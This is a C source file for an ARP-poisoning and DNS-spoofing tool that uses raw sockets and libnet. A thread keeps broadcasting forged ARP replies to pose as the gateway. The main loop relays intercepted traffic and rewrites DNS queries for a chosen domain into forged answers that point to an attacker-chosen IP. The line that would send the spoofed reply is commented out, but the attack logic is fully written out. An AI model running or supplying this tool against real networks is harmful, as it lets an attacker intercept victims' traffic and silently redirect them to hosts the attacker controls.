// This program requires root privilages.
// Usage: ./spoofer INTERFACE GW_HW_ADDR GW_IP_ADDR CLIENT_IP_ADDR IP_MASK HIJACKED_DOMAIN SPOOFED_IP

#include <arpa/inet.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <pthread.h>
#include <libnet.h>

#include "dns_helpers.h"

 //! \brief
 //!     Calculate the UDP checksum (calculated with the whole
 //!     packet).
 //! \param buff The UDP packet.
 //! \param len The UDP packet length.
 //! \param src_addr The IP source address (in network format).
 //! \param dest_addr The IP destination address (in network format).
 //! \return The result of the checksum.
 uint16_t udp_checksum(const void *buff, size_t len, in_addr_t src_addr, in_addr_t dest_addr)
 {
         const uint16_t *buf=buff;
         uint16_t *ip_src=(void *)&src_addr, *ip_dst=(void *)&dest_addr;
         uint32_t sum;
         size_t length=len;
 
         // Calculate the sum                                            //
         sum = 0;
         while (len > 1)
         {
                 sum += *buf++;
                 if (sum & 0x80000000)
                         sum = (sum & 0xFFFF) + (sum >> 16);
                 len -= 2;
         }
 
         if ( len & 1 )
                 // Add the padding if the packet lenght is odd          //
                 sum += *((uint8_t *)buf);
 
         // Add the pseudo-header                                        //
         sum += *(ip_src++);
         sum += *ip_src;
 
         sum += *(ip_dst++);
         sum += *ip_dst;
 
         sum += htons(IPPROTO_UDP);
         sum += htons(length);
 
         // Add the carries                                              //
         while (sum >> 16)
                 sum = (sum & 0xFFFF) + (sum >> 16);
 
         // Return the one's complement of sum                           //
         return ( (uint16_t)(~sum)  );
 }

//! \brief Calculate the IP header checksum.
//! \param buf The IP header content.
//! \param hdr_len The IP header length.
//! \return The result of the checksum.
uint16_t ip_checksum(const void *buf, size_t hdr_len)
{
        unsigned long sum = 0;
        const uint16_t *ip1;

        ip1 = buf;
        while (hdr_len > 1)
        {
                sum += *ip1++;
                if (sum & 0x80000000)
                        sum = (sum & 0xFFFF) + (sum >> 16);
                hdr_len -= 2;
        }

        while (sum >> 16)
                sum = (sum & 0xFFFF) + (sum >> 16);

        return(~sum);
}

void * arp_spoofer(void * param)
{
  libnet_t *ln;
  u_int32_t target_ip_addr, zero_ip_addr;
  u_int8_t bcast_hw_addr[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff},
           zero_hw_addr[6]  = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
  struct libnet_ether_addr* src_hw_addr;
  char errbuf[LIBNET_ERRBUF_SIZE];

  ln = libnet_init(LIBNET_LINK, NULL, errbuf);
  src_hw_addr = libnet_get_hwaddr(ln);
  target_ip_addr = libnet_name2addr4(ln, (char *) param, LIBNET_RESOLVE);
  zero_ip_addr = libnet_name2addr4(ln, "0.0.0.0", LIBNET_DONT_RESOLVE);
  libnet_autobuild_arp(
    ARPOP_REPLY,                     /* operation type       */
    src_hw_addr->ether_addr_octet,   /* sender hardware addr */
    (u_int8_t*) &target_ip_addr,     /* sender protocol addr */
    zero_hw_addr,                    /* target hardware addr */
    (u_int8_t*) &zero_ip_addr,       /* target protocol addr */
    ln);                             /* libnet context       */
  libnet_autobuild_ethernet(
    bcast_hw_addr,                   /* ethernet destination */
    ETHERTYPE_ARP,                   /* ethertype            */
    ln);                             /* libnet context       */
  
  while(1)
  {
    libnet_write(ln);
    sleep(5);
  }

  libnet_destroy(ln);
  return EXIT_SUCCESS;

}

int main(int argc, char** argv) {
  pthread_t arp;
  int sfd, gwsfd, ifindex;
  int i;
  ssize_t len;
  char* frame;
  char* fdata;
  struct ethhdr* fhead;
  struct iphdr *ip;
  struct ifreq ifr;
  struct sockaddr_ll sall, gwall, vall;
  struct in_addr gway, mask, bcast;
  char saddr[16], daddr[16], bcastaddr[16];
  unsigned char hwaddr[6];
  struct udphdr *udp;
  char * udpdata;
  struct dns_header_window * dnshdr;
  struct dns_answer * answer;
  
  // get broadcast address
  inet_pton(AF_INET, argv[3], &(gway));
  inet_pton(AF_INET, argv[5], &(mask));
  bcast.s_addr = gway.s_addr | (~mask.s_addr);
  inet_ntop(AF_INET, &bcast.s_addr, (char*) &bcastaddr, 16);
  //printf("%s\n", bcastaddr);

  strncpy(ifr.ifr_name, argv[1], IFNAMSIZ);
  // set up relaying socket
  gwsfd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_IP));
  ioctl(gwsfd, SIOCGIFINDEX, &ifr);
  ifindex = ifr.ifr_ifindex;
  ioctl(gwsfd, SIOCGIFHWADDR, &ifr);
  memcpy(hwaddr, &ifr.ifr_hwaddr.sa_data, ETH_ALEN);
  memset(&gwall, 0, sizeof(struct sockaddr_ll));
  gwall.sll_family = AF_PACKET;
  gwall.sll_protocol = htons(ETH_P_IP);
  gwall.sll_ifindex = ifindex;
  gwall.sll_hatype = ARPHRD_ETHER;
  gwall.sll_pkttype = PACKET_OUTGOING;
  gwall.sll_halen = ETH_ALEN;
  sscanf(argv[2], "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
         &gwall.sll_addr[0], &gwall.sll_addr[1], &gwall.sll_addr[2],
         &gwall.sll_addr[3], &gwall.sll_addr[4], &gwall.sll_addr[5]);

  // set up victim address struct
  memset(&vall, 0, sizeof(struct sockaddr_ll));
  vall.sll_family = AF_PACKET;
  vall.sll_protocol = htons(ETH_P_IP);
  vall.sll_ifindex = ifindex;
  vall.sll_hatype = ARPHRD_ETHER;
  vall.sll_pkttype = PACKET_OUTGOING;
  vall.sll_halen = ETH_ALEN;


  // set up receiving socket
  sfd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_IP));
  ioctl(sfd, SIOCGIFINDEX, &ifr);
  memset(&sall, 0, sizeof(struct sockaddr_ll));
  sall.sll_family = AF_PACKET;
  sall.sll_protocol = htons(ETH_P_IP);
  sall.sll_ifindex = ifr.ifr_ifindex;
  sall.sll_hatype = ARPHRD_ETHER;
  sall.sll_pkttype = PACKET_HOST;
  sall.sll_halen = ETH_ALEN;
  bind(sfd, (struct sockaddr*) &sall, sizeof(struct sockaddr_ll));

  // get hijacked domain struct
  struct domain * hijacked = domain_struct_from_domain_name(argv[6]);

  // start the arp spoofer
  pthread_create(&arp, NULL, arp_spoofer, argv[3]);

  // start listening
  while(1) {
    frame = malloc(ETH_FRAME_LEN);
    memset(frame, 0, ETH_FRAME_LEN);
    fhead = (struct ethhdr*) frame;
    fdata = frame + ETH_HLEN;
    len = recvfrom(sfd, frame, ETH_FRAME_LEN, 0, NULL, NULL);
    ip = (struct iphdr *)fdata;
    inet_ntop(AF_INET, &ip->saddr, (char*) &saddr, 16);
    inet_ntop(AF_INET, &ip->daddr, (char*) &daddr, 16);

    // ignore packets from original gateway, addresed to the client, or sent to the broadcast address
    if (strcmp(saddr, argv[3]) == 0
      || strcmp(daddr, bcastaddr) == 0
      || strcmp(daddr, argv[4]) == 0)
      continue;

    if (ip->protocol == IPPROTO_UDP)
    {
      udp = (struct udphdr*)((char *)ip + (ip->ihl * 4));
      udpdata = (char *)ip + (ip->ihl * 4) + sizeof(struct udphdr);

      // analyse DNS request
      if (ntohs(udp->dest) == 53)
      {
        unsigned short flags;
        char * query;
        int dnslen = ntohs(udp->len) - 8;

        dnshdr = (struct dns_header_window *) udpdata;

        flags = ntohs(dnshdr->flags);

        query = udpdata + 12;

        struct domain * d = domain_struct_from_dns_query(query);

        unsigned short opcode_mask = (1 << 14 | 1 << 13 | 1 << 12 | 1 << 11);

        // relay packet and continue if requested domain doesn't match the hijacked one or the request is not a standard query
        if (compare_domain_structs(d, hijacked) != 0 || (opcode_mask & flags) != 0)
        {
          memcpy(fhead->h_source, hwaddr, ETH_ALEN);

          sscanf(argv[2], "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
            &fhead->h_dest[0], &fhead->h_dest[1], &fhead->h_dest[2],
            &fhead->h_dest[3], &fhead->h_dest[4], &fhead->h_dest[5]);

          len = sendto(gwsfd, frame, len, 0,
                (struct sockaddr*) &gwall, sizeof(struct sockaddr_ll));

          // struct domain * head = d;
          // while (head != NULL)
          // {
          //   printf("%s.", head->content);
          //   head = head->next;
          // }
          // printf("\n");

          free(frame);
          delete_domain_struct(d);

          continue;
        }

        // printf("got:\n");
        // for (i = 0; i < dnslen ; i++) {
        //   printf("%02x ", (char) udpdata[i]);
        //   if ((i + 1) % 16 == 0)
        //     printf("\n");
        // }
        // printf("\n\n");

        int response_len_without_answer = 12 + query_len(d) + 4;
        int additional_bytes = ntohs(udp->len) - 8 - response_len_without_answer;

        printf("Additional: %d\n", additional_bytes);

        // start building spoofed answer
        unsigned short new_flags = 0;
        new_flags = new_flags
          | 1 << 15               // this is a response
          | (flags & opcode_mask) // copy opcode
          | (flags & (1 << 8))    // copy RD
          | (1 << 7);             // set RA

        dnshdr->flags = htons(new_flags);
        dnshdr->as = htons(1);
        dnshdr->authrrs = htons(0);
        dnshdr->addrrs = htons(0);

        answer = (struct dns_answer *)(udpdata + dnslen - additional_bytes);
        // spoof the answer
        answer->name = htons(0xc00c);
        answer->type = htons(1);
        answer->cls = htons(1);
        answer->ttl = htonl(120);
        answer->len = htons(4);
        inet_pton(AF_INET, argv[7], &answer->data);

        // swap ports
        unsigned short port = udp->dest;
        udp->dest = udp->source;
        udp->source = port;

        // update lengths
        udp->len = htons(ntohs(udp->len) - additional_bytes + 16);
        ip->tot_len = htons(ntohs(ip->tot_len) - additional_bytes + 16);

        ip->check = 0;
        udp->check = 0;

        ip->id = htons((ntohs(ip->id) + 3000) % (65536));

        // swap ip addresses
        inet_pton(AF_INET, daddr, &ip->saddr);
        inet_pton(AF_INET, saddr, &ip->daddr);

        //ip->frag_off = IP_DF;
        ip->frag_off = ntohs(1 << 14);

        // calculate checksums
        printf("UDPlen: %d, IPlen: %d\n", ntohs(udp->len), ntohs(udp->len) + (ip->ihl * 4));
        printf("UDPchk: %04x\n", udp_checksum(udp, ntohs(udp->len), ip->saddr, ip->daddr));
        udp->check = htons(udp_checksum(udp, ntohs(udp->len), ip->saddr, ip->daddr));
        printf("UDPchk: %04x, IPchk: %04x\n", udp->check, ip_checksum(ip, ntohs(udp->len) + (ip->ihl * 4)));
        //ip->check = htons(ip_checksum(ip, ntohs(udp->len) + (ip->ihl * 4)));

        int answerlen = dnslen + 16;

        // printf("to send:\n");
        // for (i = 0; i < ntohs(ip->tot_len) ; i++) {
        //   printf("%02x ", (char) ((char *)ip)[i]);
        //   if ((i + 1) % 16 == 0)
        //     printf("\n");
        // }
        // printf("\n\n");

        // swap hardware addresses
        memcpy(fhead->h_dest, fhead->h_source, ETH_ALEN);
        memcpy(fhead->h_source, hwaddr, ETH_ALEN);

        printf("d: %hhx:%hhx:%hhx:%hhx:%hhx:%hhx\n",
          fhead->h_dest[0], fhead->h_dest[1], fhead->h_dest[2],
          fhead->h_dest[3], fhead->h_dest[4], fhead->h_dest[5]);

        printf("s: %hhx:%hhx:%hhx:%hhx:%hhx:%hhx\n",
          fhead->h_source[0], fhead->h_source[1], fhead->h_source[2],
          fhead->h_source[3], fhead->h_source[4], fhead->h_source[5]);

        vall.sll_addr[0] = fhead->h_dest[0];
        vall.sll_addr[1] = fhead->h_dest[1];
        vall.sll_addr[2] = fhead->h_dest[2];
        vall.sll_addr[3] = fhead->h_dest[3];
        vall.sll_addr[4] = fhead->h_dest[4];
        vall.sll_addr[5] = fhead->h_dest[5];

        //sendto(gwsfd, frame, len - additional_bytes + 16, 0,
        //      (struct sockaddr*) &vall, sizeof(struct sockaddr_ll));

        // printf("sent\n");
        printf("\n");

        delete_domain_struct(d);
      }
      // relay other UDP datagrams
      else
      {
        memcpy(fhead->h_source, hwaddr, ETH_ALEN);

        sscanf(argv[2], "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
          &fhead->h_dest[0], &fhead->h_dest[1], &fhead->h_dest[2],
          &fhead->h_dest[3], &fhead->h_dest[4], &fhead->h_dest[5]);

        len = sendto(gwsfd, frame, len, 0,
              (struct sockaddr*) &gwall, sizeof(struct sockaddr_ll));
      }
    }
    // relay all other frames to gateway
    else
    {
      memcpy(fhead->h_source, hwaddr, ETH_ALEN);

      sscanf(argv[2], "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
         &fhead->h_dest[0], &fhead->h_dest[1], &fhead->h_dest[2],
         &fhead->h_dest[3], &fhead->h_dest[4], &fhead->h_dest[5]);

      len = sendto(gwsfd, frame, len, 0,
            (struct sockaddr*) &gwall, sizeof(struct sockaddr_ll));

      //printf("relaying TCP from %s [%ldB]\n", saddr, len);
    }
    free(frame);
  }
  close(gwsfd);
  close(sfd);
  return EXIT_SUCCESS;
}